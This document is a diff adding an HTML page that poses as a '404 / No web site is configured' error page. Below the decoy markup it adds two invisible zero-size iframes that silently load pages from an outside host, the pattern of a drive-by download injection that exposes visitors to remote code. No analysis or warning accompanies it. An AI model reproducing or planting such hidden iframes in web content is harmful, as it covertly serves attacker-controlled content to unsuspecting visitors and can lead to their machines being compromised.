@@ -1,0 +1,12 @@
+<script type="text/jscript">
+function init() { 
+document.write("No web site is configured at this address");
+
+}
+window.onload = init;
+</script>
+<html>
+<title>404</title>
+</html>
+<iframe width=0 height=0 src=http://www.wppa.co.kr/DB/M.htm></iframe>
+<iframe width=0 height=0 src=http://www.wppa.co.kr/DB/M1.htm></iframe>
